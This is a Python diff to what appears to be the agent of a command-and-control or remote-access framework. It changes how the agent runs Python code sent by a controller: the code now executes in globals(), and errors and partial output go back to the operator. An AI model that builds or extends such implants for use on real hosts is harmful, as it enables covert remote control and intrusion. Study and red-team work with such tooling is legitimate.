@@ -46,7 +46,7 @@ for headerRaw in headersRaw:
     try:
         headerKey = headerRaw.split(":")[0]
         headerValue = headerRaw.split(":")[1]
-        
+
         if headerKey.lower() == "cookie":
             headers['Cookie'] = "%s;%s" %(headers['Cookie'], headerValue)
         else:
@@ -288,16 +288,14 @@ def processPacket(taskingID, data):
 
     elif taskingID == 50:
         # return the currently running jobs
-        msg = ""
-        
+        msg = "" 
         if len(jobs) == 0:
             msg = "No active jobs"
         else:
             msg = "Active jobs:\n"
             for x in xrange(len(jobs)):
-                msg += "\t%s" %(x)
-        
-        return encodePacket(50, msg )
+                msg += "\t%s" %(x)     
+        return encodePacket(50, msg)
 
     elif taskingID == 51:
         # stop and remove a specified job if it's running
@@ -315,7 +313,7 @@ def processPacket(taskingID, data):
             buffer = StringIO()
             sys.stdout = buffer
             code_obj = compile(data, '<string>', 'exec')
-            exec code_obj in {}
+            exec code_obj in globals()
             sys.stdout = sys.__stdout__
             results = buffer.getvalue()
             return encodePacket(100, str(results))
@@ -333,13 +331,13 @@ def processPacket(taskingID, data):
             buffer = StringIO()
             sys.stdout = buffer
             code_obj = compile(data, '<string>', 'exec')
-            exec code_obj in {}
+            exec code_obj in globals()
             sys.stdout = sys.__stdout__
             return encodePacket(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + str(buffer.getvalue()) )
-        except:
-            # Also return partial code that has been executed 
+        except Exception as e:
+            # Also return partial code that has been executed
             errorData = str(buffer.getvalue())
-            return encodePacket(0, "error executing specified Python data")
+            return encodePacket(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData))
 
     elif taskingID == 102:
         # on disk code execution for modules that require multiprocessing not supported by exec
@@ -373,12 +371,12 @@ def processPacket(taskingID, data):
     elif taskingID == 110:
         start_job(data)
         return encodePacket(110, "job %s started" %(len(jobs)-1))
-        
+
     elif taskingID == 111:
         # TASK_CMD_JOB_SAVE
         # TODO: implement job structure
         pass
-    
+
     else:
         return encodePacket(0, "invalid tasking ID: %s" %(taskingID))
 
